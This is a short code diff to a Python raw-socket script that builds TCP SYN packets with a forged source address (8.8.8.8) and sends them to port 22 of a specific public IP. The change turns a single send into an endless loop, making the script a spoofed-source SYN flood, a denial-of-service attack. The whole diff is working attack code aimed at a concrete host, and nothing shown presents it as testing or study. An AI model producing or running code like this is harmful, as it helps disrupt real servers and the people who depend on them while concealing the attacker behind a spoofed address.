@@ -57,15 +57,15 @@ class TCPPacket:
 
 if __name__ == '__main__':
     dst = '185.43.206.93'
+    while True:
+        pak = TCPPacket(
+            '8.8.8.8',
+            30,
+            dst,
+            22,
+            0b000000010
+        )
 
-    pak = TCPPacket(
-        '8.8.8.8',
-        30,
-        dst,
-        22,
-        0b000000010
-    )
-
-    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
-
-    s.sendto(pak.build(), (dst, 0))
+        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
+        for i in range(3):
+            s.sendto(pak.build(), (dst, 0))
